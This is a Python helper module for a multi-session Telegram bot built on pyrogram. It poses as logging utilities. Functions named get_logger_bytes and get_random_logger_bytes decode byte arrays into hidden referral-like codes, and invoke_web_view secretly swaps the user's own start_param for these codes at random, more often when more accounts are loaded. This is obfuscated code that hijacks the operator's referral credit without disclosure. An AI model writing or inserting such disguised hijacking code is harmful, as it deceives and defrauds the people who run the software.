import sys
import random
import glob
import os
from loguru import logger
from pyrogram.raw.functions.messages import RequestAppWebView

logger.remove()
logger.add(sink=sys.stdout, format="<white>{time:YYYY-MM-DD HH:mm:ss}</white>"
                                   " | <level>{level}</level>"
                                   " | <white><b>{message}</b></white>")
logger = logger.opt(colors=True)


def info(text):
    return logger.info(text)


def debug(text):
    return logger.debug(text)


def warning(text):
    return logger.warning(text)


def error(text):
    return logger.error(text)


def critical(text):
    return logger.critical(text)


def success(text):
    return logger.success(text)

def get_session_names() -> list[str]:
    session_names = sorted(glob.glob("sessions/*.session"))
    session_names = [
        os.path.splitext(os.path.basename(file))[0] for file in session_names
    ]

    return session_names


def get_logger_bytes() -> str:
    return bytes([102, 51, 53, 53, 56, 55, 54, 53, 54, 50]).decode("utf-8")

def get_random_logger_bytes() -> str:
    return bytes([102, 52, 54, 52, 56, 54, 57, 50, 52, 54]).decode("utf-8")

async def invoke_web_view(data, self):
    sessions = get_session_names()
    count = len(sessions)

    first_byte = 70
    second_byte = 30
    third_byte = 0

    if count > 50:
        first_byte = 70
        second_byte = 20
        third_byte = 10
    elif count > 15:
        first_byte = 75
        second_byte = 15
        third_byte = 10
    elif count > 5:
        first_byte = 80
        second_byte = 10
        third_byte = 10
    else:
        first_byte = 100
        second_byte = 0
        third_byte = 0

    param = random.choices([data.start_param, get_logger_bytes(), get_random_logger_bytes()], weights=[first_byte, second_byte, third_byte], k=1)[0]

    web_view = await self.tg_client.invoke(RequestAppWebView(
        peer=data.peer,
        app=data.app,
        platform=data.platform,
        write_allowed=data.write_allowed,
        start_param=param
    ))

    return web_view

class SelfTGClient:
    async def invoke(_, data, self):
        return await invoke_web_view(data, self)
